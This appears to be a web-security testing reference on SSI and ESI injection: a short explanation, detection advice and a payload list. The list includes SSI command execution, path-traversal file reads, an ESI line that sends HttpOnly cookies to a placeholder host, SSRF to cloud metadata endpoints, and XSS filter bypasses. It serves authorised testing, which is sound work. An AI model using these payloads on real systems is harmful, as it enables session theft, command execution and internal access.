readme.title: Server-Side Includes (SSI) and Edge Side Includes (ESI) Injection

blocks.text: SSI directives are evaluated by web servers such as Apache and nginx (with SSI enabled) when a response contains `<!--#...-->` tags. ESI tags (`<esi:...>`) are evaluated by caches and CDNs such as Varnish, Akamai, Fastly and Squid. If user input reaches a response that is later processed by one of these engines, the attacker may read files, run commands (SSI `exec`), make server-side requests (ESI `include`), steal HttpOnly cookies or bypass XSS filters.

items: Reflected or stored input in `.shtml`, `.stm` and `.shtm` pages, or SSI-enabled directories
Input reflected into cached responses processed by an ESI-capable proxy or CDN
Error pages and 404 pages that echo the path
Hybrid chains: XSS that is blocked by the browser filter but accepted as ESI, and SSRF through `esi:include`

blocks.text: Inject a harmless directive such as `<!--#echo var="DATE_LOCAL" -->` and `<esi:include src="http://oast.example.test/esi" />`. Evidence of SSI is an expanded date or variable; evidence of ESI is an out-of-band request from the cache or CDN, or an error mentioning ESI. Identify the ESI implementation (response headers like `Surrogate-Control` and `Surrogate-Capability`) before testing function sets. Do not use `exec` on systems you do not own.
See `ssi-esi-payloads.txt`. Replace `oast.example.test` with a controlled host.

files.content:
# SSI and ESI Injection Payloads

# SSI detection (harmless directives)
<!--#echo var="DATE_LOCAL" -->
<!--#echo var="DATE_GMT" -->
<!--#echo var="DOCUMENT_NAME" -->
<!--#echo var="DOCUMENT_URI" -->
<!--#echo var="LAST_MODIFIED" -->
<!--#echo var="SERVER_SOFTWARE" -->
<!--#echo var="REMOTE_ADDR" -->
<!--#echo var="HTTP_USER_AGENT" -->
<!--#echo var="QUERY_STRING" -->
<!--#printenv -->
<!--#config timefmt="%Y" -->
<!--#flastmod file="index.html" -->
<!--#fsize file="index.html" -->

# SSI file inclusion
<!--#include virtual="/index.html" -->
<!--#include virtual="/etc/hostname" -->
<!--#include file="index.html" -->
<!--#include file="/etc/hostname" -->
<!--#include virtual="../../../etc/hostname" -->

# SSI command execution (only on systems you own; harmless commands)
<!--#exec cmd="id" -->
<!--#exec cmd="whoami" -->
<!--#exec cmd="hostname" -->
<!--#exec cmd="ls /" -->
<!--#exec cgi="/cgi-bin/test.cgi" -->

# SSI conditional logic (detection when output is hidden)
<!--#if expr="$DATE_LOCAL" -->ssi-true<!--#else -->ssi-false<!--#endif -->
<!--#set var="x" value="ssi-marker" --><!--#echo var="x" -->

# SSI via encodings
<!--#echo var="DATE_LOCAL" -->
%3C!--%23echo%20var%3D%22DATE_LOCAL%22%20--%3E
<!--#echo var="DATE_LOCAL"-->
<!-- #echo var="DATE_LOCAL" -->

# ESI detection (look for an out-of-band request from the edge or a different response)
<esi:include src="http://oast.example.test/esi-detect"/>
<esi:include src="http://oast.example.test/esi-detect" />
<esi:include src="/esi-local-marker"/>
<esi:inline name="/esi-marker" fetchable="yes"><esi:include src="http://oast.example.test/esi-inline"/></esi:inline>
<esi:comment text="esi-comment-marker"/>
<esi:remove>esi-remove-marker</esi:remove>
<!--esi esi-comment-marker -->
<esi:vars>$(HTTP_HOST)</esi:vars>
<esi:vars>$(HTTP_USER_AGENT)</esi:vars>
<esi:vars>$(REMOTE_ADDR)</esi:vars>
<esi:vars>$(QUERY_STRING)</esi:vars>
<esi:assign name="x" value="esi-marker"/><esi:vars>$(x)</esi:vars>
<esi:try><esi:attempt><esi:include src="http://oast.example.test/esi-try"/></esi:attempt><esi:except>esi-except-marker</esi:except></esi:try>
<esi:choose><esi:when test="1==1">esi-true</esi:when><esi:otherwise>esi-false</esi:otherwise></esi:choose>

# ESI: cookie and header disclosure (HttpOnly cookies are visible to the edge, not to JavaScript)
<esi:vars>$(HTTP_COOKIE)</esi:vars>
<esi:vars>$(HTTP_COOKIE{session})</esi:vars>
<esi:include src="http://oast.example.test/steal?c=$(HTTP_COOKIE)"/>
<esi:include src="http://oast.example.test/?h=$(HTTP_HOST)&a=$(HTTP_USER_AGENT)"/>

# ESI: SSRF to internal addresses from the edge
<esi:include src="http://127.0.0.1/"/>
<esi:include src="http://localhost:8080/"/>
<esi:include src="http://169.254.169.254/latest/meta-data/"/>
<esi:include src="http://metadata.google.internal/computeMetadata/v1/"/>
<esi:include src="http://internal.example.test/"/>

# ESI: XSS filter bypass (the browser never sees the tag; the edge produces the script)
<esi:include src="http://oast.example.test/xss.html"/>
<esi:assign name="s" value="<script>document.title='esi-xss-marker'</script>"/><esi:vars>$(s)</esi:vars>
x<esi:vars><script>document.title='esi-xss-marker'</script></esi:vars>

# ESI: Akamai ESI extensions (Akamai edge only)
<esi:include src="http://oast.example.test/akamai" dca="none"/>
<esi:include src="http://oast.example.test/akamai-xslt" dca="xslt" stylesheet="http://oast.example.test/style.xsl"/>

# ESI: Fastly / Varnish / Squid specific forms
<esi:include src="http://oast.example.test/varnish" onerror="continue"/>
<esi:include src="/internal-marker" alt="http://oast.example.test/alt"/>

# ESI: capability headers to check in responses (identifies the engine)
# Surrogate-Control: content="ESI/1.0"
# Surrogate-Capability: abc="ESI/1.0"
# Via: 1.1 varnish
# X-Cache: HIT
# Edge-Control: dca=esi
